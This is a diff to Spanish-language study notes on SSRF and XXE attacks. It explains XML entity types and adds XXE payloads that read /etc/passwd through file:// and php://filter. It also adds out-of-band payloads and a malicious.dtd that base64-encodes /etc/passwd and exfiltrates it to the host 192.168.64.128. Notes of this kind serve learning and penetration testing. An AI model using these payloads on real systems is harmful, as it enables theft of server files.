@@ -17,19 +17,50 @@ Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direccion
 
 Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener información sensible o incluso tomar el control de los servicios internos.
 -- -
+## Entidades:
+Las entidades son una forma de representar un elemento de datos sin referenciar a los datos como tal, todo esto en un documento XML.
 
+**Tipos de entidades:**
+- Genéricas / Customizadas
+- Externas (XXE)
+- Predefinidas ---> General Entities
+	- &lt (Lower Than);
+	- &gt (Grater Than); 
+- Entidades Parametricas ---> %nombre_entidad;
+### Ejemplo de una estructura XML
+```xml
+<?xml version="1.0" encoding="UTF-8"?> ---> Declaración XML
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "mi entidad">]> ---> DTD (Document Type Definition)
+
+<root>
+	<name>fran</name>
+	<tel>5454545as</tel>
+	><email>fran@fran.com</email>
+	><password>fran123</password>
+</root>
+```
+
+-- -
 ## Payloads: 
-- <!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
-- <!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+```xml
+<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+ ```
 
 # XXE Out Of Band interaction (OOB) 
 Estas mismas son lo mismo que las anteriores solo que a ciegas:
-- <!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.0.229/testXXE">]>
-
-
-
-
-
+```xml
+<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.64.128/testXXE">]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.64.128/malicious.dtd"> %xxe;]> # ---> Lo declaro ahi mismo ya que a veces no te deja declararlo en el propio cuerpo. 
+```
+**Archivo malicious.dtd:**
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.64.128/?file=%file;'>">
+%eval; 
+%exfil;
+```
+-- -
 ## Aclaraciones:
 - Siempre hay que "invocar" el nombre de la entidad dentro de la estructura XML para asi ejecutar el payload. (&myFile dentro de algun tag). 
 
